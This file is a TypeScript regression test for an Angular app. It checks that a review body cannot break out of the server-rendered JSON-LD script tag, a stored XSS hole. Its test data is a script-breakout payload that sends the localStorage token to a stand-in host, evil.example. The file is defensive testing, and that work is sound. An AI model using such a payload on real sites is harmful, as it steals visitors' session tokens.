import { DOCUMENT } from '@angular/common';
import { TestBed } from '@angular/core/testing';
import { beforeEach, describe, expect, it } from 'vitest';
import { UnitDetails } from '../models/unit.model';
import { buildUnitJsonLd } from '../utils/unit-seo.utils';
import { SeoService } from './seo.service';

// Regression cover for the stored-XSS sink in the prerendered JSON-LD tag.
//
// The route under test is SeoService.setJsonLd, which is what writes the
// <script type="application/ld+json"> into the document head. Under SSR
// (angular.json sets outputMode "server") that runs on the server and its output
// is serialized into the HTML every later visitor receives, so a review body that
// closed the tag would execute in their browser, with the JWT sitting in
// localStorage.
//
// setJsonLd is driven directly rather than through updateUnitPage because
// updateUnitPage is gated on environment.seoEnabled, and environment.ts is
// generated at build time by set-env.js: the checked-in copy is the local
// placeholder with SEO off, while production builds write seoEnabled true. Going
// through updateUnitPage here would take the noIndex() branch, skip setJsonLd
// entirely, and pass every assertion below without serializing anything. The gate
// is a build-time SEO switch, not part of the vulnerability.
const SITE_URL = 'https://curtinhonestly.com';

// A stored review body that tries to close the JSON-LD script and open its own,
// exfiltrating the token the app keeps in localStorage. reviewText is
// attacker-supplied: anyone who can post a review can put this in the page.
const XSS_PAYLOAD =
  '</script><script>fetch("https://evil.example/steal?t="+localStorage.getItem("token"))</script>';

function unitWithPayloadReview(): UnitDetails {
  return {
    code: 'ISYS1000',
    name: 'Introduction to Business Information Systems',
    description: 'An introductory IS unit.',
    unitLink: 'https://handbook.curtin.edu.au/units/isys1000',
    faculty: 'Business and Law',
    level: 'UNDERGRADUATE',
    area: '',
    fieldOfEducation: '',
    credits: 25,
    contactHours: 3,
    resultType: 'Grade',
    tuitionPatterns: [],
    prerequisiteGroups: [],
    numberOfReviews: 1,
    averageRating: 5,
    averageWorkload: 5,
    averageFinalGrade: 70,
    wouldTakeAgainRatio: 1,
    reviews: [
      {
        rating: 5,
        reviewText: XSS_PAYLOAD,
        termType: 'SEMESTER_1',
        termYear: 2026,
        professor: 'Smith',
        workload: 5,
        hasExam: false,
        wouldTakeAgain: true,
        reviewerVerified: false,
        createdAt: '2026-01-01T00:00:00Z',
      },
    ],
  } as unknown as UnitDetails;
}

/** Run the payload through the real graph builder and the real JSON-LD writer. */
function renderJsonLd(seo: SeoService, doc: Document): HTMLScriptElement {
  const graph = buildUnitJsonLd(unitWithPayloadReview(), SITE_URL);
  (seo as unknown as { setJsonLd(data: Record<string, unknown>): void }).setJsonLd(graph);
  return doc.getElementById('seo-json-ld') as HTMLScriptElement;
}

describe('SeoService JSON-LD script-breakout (stored XSS)', () => {
  let seo: SeoService;
  let doc: Document;

  beforeEach(() => {
    TestBed.configureTestingModule({});
    seo = TestBed.inject(SeoService);
    doc = TestBed.inject(DOCUMENT);
    doc.getElementById('seo-json-ld')?.remove();
  });

  it('writes a JSON-LD script that actually carries the payload', () => {
    const script = renderJsonLd(seo, doc);

    // Positive assertions first. If the graph builder dropped the review, or
    // setJsonLd never ran, the breakout assertions below would pass while proving
    // nothing. These pin down that the hostile text really did reach the tag.
    expect(script).not.toBeNull();
    expect(script.getAttribute('type')).toBe('application/ld+json');
    expect(script.textContent).toContain('u003c/script');
  });

  it('cannot break out of the script tag in the serialized markup', () => {
    const script = renderJsonLd(seo, doc);

    // outerHTML, not textContent, is the property under test. A <script> is a
    // raw-text element: a serializer writes its children verbatim without entity
    // encoding, so the serialized markup is the only place a breakout exists.
    const serialized = script.outerHTML;

    // Exactly one closing tag, the element's own. A successful breakout would put
    // the payload's own `</script>` in here as a second one.
    expect(serialized.split('</script').length - 1).toBe(1);
    expect(serialized).not.toContain('<script>');
    // No raw angle bracket survives anywhere in the JSON body.
    expect(script.textContent).not.toContain('<');
    expect(script.textContent).not.toContain('>');
  });

  it('reparses into a single inert script element', () => {
    renderJsonLd(seo, doc);

    // Reparsing the serialized head is what a visitor's browser does with the SSR
    // response. If the payload escaped, the parser would build a second <script>
    // here, and that is the moment the token theft would run.
    const reparsed = new DOMParser().parseFromString(
      `<html><head>${doc.head.innerHTML}</head><body></body></html>`,
      'text/html'
    );
    const scripts = reparsed.querySelectorAll('script');

    expect(scripts).toHaveLength(1);
    expect(scripts[0].id).toBe('seo-json-ld');
    // application/ld+json is data, not an executable script type.
    expect(scripts[0].getAttribute('type')).toBe('application/ld+json');
    expect(scripts[0].textContent).not.toContain('<');
  });

  it('keeps the review body intact for JSON-LD consumers', () => {
    const script = renderJsonLd(seo, doc);

    // Escaping must not corrupt the data: a conformant parser decodes < back
    // to `<`, so search engines still read the review exactly as it was written.
    const graph = JSON.parse(script.textContent!)['@graph'] as Record<string, unknown>[];
    const course = graph.find((node) => node['@type'] === 'Course')!;
    const reviews = course['review'] as Record<string, unknown>[];

    expect(reviews[0]['reviewBody']).toBe(XSS_PAYLOAD);
  });
});
